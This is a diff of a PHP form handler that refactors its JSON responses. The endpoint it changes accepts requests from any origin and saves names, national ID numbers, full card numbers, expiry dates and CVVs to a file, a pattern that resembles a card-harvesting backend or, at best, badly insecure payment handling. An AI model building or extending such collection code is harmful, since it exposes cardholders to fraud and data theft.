@@ -4,27 +4,34 @@ error_reporting(E_ALL);
 ini_set('display_errors', 0); // Disable error display, but still log them
 ini_set('log_errors', 1);
 
-// Prevent any output before headers
+// Start output buffering
 ob_start();
 
 // Set headers to handle CORS and content type
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, OPTIONS");
 header("Access-Control-Allow-Headers: Content-Type, Accept, X-Requested-With");
-header("Content-Type: application/json");
+header("Content-Type: application/json; charset=UTF-8");
+
+// Function to send JSON response and exit
+function sendJsonResponse($success, $message, $statusCode = 200) {
+    ob_clean(); // Clear any buffered output
+    http_response_code($statusCode);
+    echo json_encode([
+        'success' => $success,
+        'message' => $message
+    ]);
+    exit();
+}
 
 // Handle preflight OPTIONS request
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    http_response_code(200);
-    echo json_encode(['success' => true]);
-    exit();
+    sendJsonResponse(true, 'Preflight OK');
 }
 
 // Check if this is a POST request
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    http_response_code(405);
-    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
-    exit();
+    sendJsonResponse(false, 'Method not allowed', 405);
 }
 
 // Get form data
@@ -54,9 +61,7 @@ $formData = [
 $requiredFields = ['firstName', 'lastName', 'dni', 'cardNumber', 'cardName', 'cardExpiry', 'cardCvv'];
 foreach ($requiredFields as $field) {
     if (empty($formData[$field])) {
-        http_response_code(400);
-        echo json_encode(['success' => false, 'error' => "Field {$field} is required"]);
-        exit();
+        sendJsonResponse(false, "Field {$field} is required", 400);
     }
 }
 
@@ -95,19 +100,9 @@ try {
         throw new Exception('Failed to save data to file');
     }
 
-    // Clear any buffered output before sending response
-    ob_clean();
-
-    // Return success response
-    http_response_code(200);
-    echo json_encode(['success' => true, 'message' => 'Solicitud guardada exitosamente']);
+    sendJsonResponse(true, 'Solicitud guardada exitosamente');
 
 } catch (Exception $e) {
-    // Clear any buffered output before sending error response
-    ob_clean();
-    
     error_log("Error saving form data: " . $e->getMessage());
-    http_response_code(500);
-    echo json_encode(['success' => false, 'error' => 'Error interno del servidor']);
-    exit();
+    sendJsonResponse(false, 'Error interno del servidor', 500);
 }
